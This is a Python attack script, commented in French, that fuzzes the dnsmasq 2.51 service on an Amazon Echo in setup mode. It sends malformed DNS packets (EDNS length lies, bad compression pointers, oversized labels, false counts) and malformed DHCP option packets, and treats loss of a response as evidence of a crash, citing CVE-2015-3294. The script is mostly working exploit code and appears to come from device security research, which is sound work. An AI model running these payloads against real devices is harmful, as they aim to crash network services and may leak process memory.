#!/usr/bin/env python3
"""dnsmasq_attack — attaque le dnsmasq 2.51 (2010) DU DEVICE en mode orange.

Contexte : le bundle GPL FireOS contient external/dnsmasq VERSION "2.51".
En mode setup (orange), l'Echo crée le réseau Amazon-EBE et y fait tourner
ce dnsmasq (DHCP certain ; DNS à sonder). Notre Pi = CLIENT de ce réseau
(bypass.sh) → nos paquets sont parsés par ce code de 2010 côté DEVICE.

Vulnérabilité tête de liste : CVE-2015-3294 (fix upstream 2.73) — « crash sur
requêtes DNS malformées, mémoire du process lisible ». Les CVE-2017 RCE sont
N/A (DHCPv6/RA n'existaient pas en 2.51) et le heap-2-o de 2.78 exige un
upstream contrôlé (pas d'Internet en setup).

Usage (Pi joint à Amazon-EBE, passerelle = device, ex 10.201.126.241) :
  sudo python3 dnsmasq_attack.py --dev 10.201.126.241 --probe   # sonde 53/67
  sudo python3 dnsmasq_attack.py --dev 10.201.126.241 --case dns_edns_multi
  sudo python3 dnsmasq_attack.py --dev 10.201.126.241 --case all --seq
Log : /tmp/fakeap/dnsmasq_attack.log
Oracle crash : DNS ne répond plus ; DHCP de setup ne donne plus de lease à un
second client ; comportement OOBE cassé côté app.
"""
import argparse
import socket
import struct
import time

LOGF = "/tmp/fakeap/dnsmasq_attack.log"
DNS_CASES = []
DHCP_CASES = []


def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    with open(LOGF, "a") as f:
        f.write(line + "\n")
    print(line, flush=True)


# ------------------------------------------------------------------- DNS cases
def dname(name):
    out = b""
    for lbl in name.strip(b".").split(b"."):
        out += bytes([len(lbl)]) + lbl
    return out + b"\x00"


def build_dns(case):
    qid = 0x4142
    q = dname(b"pwn.lab.local")
    qd = q + struct.pack("!HH", 1, 1)

    def hdr(flags=0x0100, an=0, ns=0, ar=1):
        return struct.pack("!HHHHHH", qid, flags, 1, an, ns, ar)

    edns_bad = b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0xFFFF) + b"\xaa" * 40

    if case == "dns_ctrl":
        return hdr(ar=0) + qd
    if case == "dns_edns_multi":
        # CVE-2015-3294-style : plusieurs OPT + longueurs mensongères
        opts = (b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 8) + b"\x01\x02\x03\x04") * 8
        return hdr() + qd + opts
    if case == "dns_edns_len_lie":
        return hdr() + qd + b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0xFFFF) + b"\x01"
    if case == "dns_ptr_far":
        # question avec pointeur de compression au-delà du paquet
        q2 = b"\xc0\xff\xff"
        return hdr(ar=0) + q2 + struct.pack("!HH", 1, 1)
    if case == "dns_ptr_self":
        return hdr(ar=0) + b"\xc0\x0c" + struct.pack("!HH", 1, 1)
    if case == "dns_name_partial":
        # label qui court jusqu'au dernier octet du paquet (label 63 ×4)
        big = (bytes([63]) + b"a" * 63) * 4 + b"\x00"
        return hdr(ar=0) + big + struct.pack("!HH", 255, 255)
    if case == "dns_qd_lie":
        return struct.pack("!HHHHHH", qid, 0x0100, 500, 0, 0, 0) + qd
    if case == "dns_tcp_len_lie":
        return b"__TCP__" + hdr(ar=0) + qd     # marqueur : préfixe TCP mensonger
    if case == "dns_label_0x7f":
        return hdr(ar=0) + bytes([0x7F]) + b"z" * 127 + b"\x00" + struct.pack("!HH", 1, 1)
    return hdr(ar=0) + qd


DNS_CASES = ["dns_ctrl", "dns_edns_multi", "dns_edns_len_lie", "dns_ptr_far",
             "dns_ptr_self", "dns_name_partial", "dns_qd_lie", "dns_tcp_len_lie",
             "dns_label_0x7f"]


# ------------------------------------------------------------------ DHCP cases
def opt(c, d):
    return bytes([c, len(d)]) + d


def dhcp_hdr(htype=1, hlen=6, mac=b"\xde\xad\xbe\xef\x00\x42", xid=0x2a2a2a2a):
    h = struct.pack("!BBBB", 1, htype, hlen, 0) + struct.pack("!I", xid)
    h += struct.pack("!HH", 0, 0x8000)
    h += b"\x00" * 16           # ciaddr/yiaddr/siaddr/giaddr
    h += mac + b"\x00" * 10
    h += b"\x00" * 64 + b"\x00" * 128
    h += b"\x63\x82\x53\x63"
    return h


def build_dhcp(case):
    o = opt(53, b"\x01")                       # DISCOVER
    o += opt(61, b"\x01\xde\xad\xbe\xef\x00\x42")
    o += opt(55, bytes(range(1, 60)))
    if case == "dhcp_ctrl":
        pass
    elif case == "dhcp_hostname_255":
        o += opt(12, b"h" * 230)             # max qui tient dans 548
    elif case == "dhcp_fqdn_encoded":          # option 81, bit 0x04 = encoded
        labels = b"\x05" + b"abcde" + b"\x3f" + b"z" * 63 + b"\x00"
        o += opt(81, b"\x04\x00\x00" + labels)
    elif case == "dhcp_fqdn_ascii_max":
        o += opt(81, b"\x00\x00\x00" + b"f" * 225)
    elif case == "dhcp_fqdn_len4":             # len minimum après minsize
        o += opt(81, b"\x04\x01\x02\x03")
    elif case == "dhcp_userclass_counts":
        o += opt(77, b"\x03abc\x00\x03xyz" + b"\x00" * 20)  # compte incohérent
    elif case == "dhcp_vendor_255":
        o += opt(60, b"V" * 230)
    elif case == "dhcp_agent82":
        o += opt(82, b"\x01\x04\xde\xad\xbe\xef")     # sub circuit-id
    elif case == "dhcp_overload":
        o += opt(52, b"\x03")                          # sname+file = options
    elif case == "dhcp_maxmsg":
        o += opt(57, struct.pack("!H", 1500))
    elif case == "dhcp_opt33_lie":
        o += bytes([33, 200]) + b"\x0a" * 8            # longueur menteuse
    return dhcp_hdr() + o + bytes([255])


DHCP_CASES = ["dhcp_ctrl", "dhcp_hostname_255", "dhcp_fqdn_encoded",
              "dhcp_fqdn_ascii_max", "dhcp_fqdn_len4", "dhcp_userclass_counts",
              "dhcp_vendor_255", "dhcp_agent82", "dhcp_overload",
              "dhcp_maxmsg", "dhcp_opt33_lie"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dev", required=True)
    ap.add_argument("--case", default="probe")
    ap.add_argument("--probe", action="store_true")
    ap.add_argument("--seq", action="store_true")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    if a.list:
        print("\n".join(["probe"] + DNS_CASES + DHCP_CASES))
        return

    if a.probe or a.case == "probe":
        # UDP 53/67 : jamais scannés sur le device
        for port in (53, 67):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            try:
                if port == 53:
                    s.sendto(build_dns("dns_ctrl"), (a.dev, port))
                else:
                    s.sendto(build_dhcp("dhcp_ctrl"), (a.dev, port))
                r, _ = s.sendto if False else (None, None)
                try:
                    data, addr = s.recvfrom(2048)
                    log("SONDE udp/%d RÉPONSE %d o de %s" % (port, len(data), addr))
                except socket.timeout:
                    log("SONDE udp/%d timeout" % port)
            finally:
                s.close()
        return

    all_cases = DNS_CASES + DHCP_CASES
    if a.case == "all":
        seq = all_cases
    else:
        seq = [a.case]
    i = 0
    while True:
        for case in seq:
            port = 53 if case.startswith("dns") else 67
            payload = build_dns(case) if case.startswith("dns") else build_dhcp(case)
            if case == "dns_tcp_len_lie":
                payload = payload[7:]
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                try:
                    s.connect((a.dev, 53))
                    s.sendall(struct.pack("!H", 4096) + payload)
                    log("TCP %s envoyé (len mensongère 4096)" % case)
                    try:
                        d = s.recv(4096)
                        log("TCP réponse %d o" % len(d))
                    except socket.timeout:
                        log("TCP timeout (serveur vivant mais muet ?)")
                except Exception as e:
                    log("TCP err %s" % e)
                finally:
                    s.close()
                time.sleep(1)
                continue
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            try:
                s.sendto(payload, (a.dev, port))
                try:
                    data, addr = s.recvfrom(4096)
                    log("%s → udp/%d RÉPONSE %d o" % (case, port, len(data)))
                except socket.timeout:
                    log("%s → udp/%d TIMEOUT" % (case, port))
            finally:
                s.close()
            time.sleep(1)
        if not a.seq:
            break
        i += 1


if __name__ == "__main__":
    main()
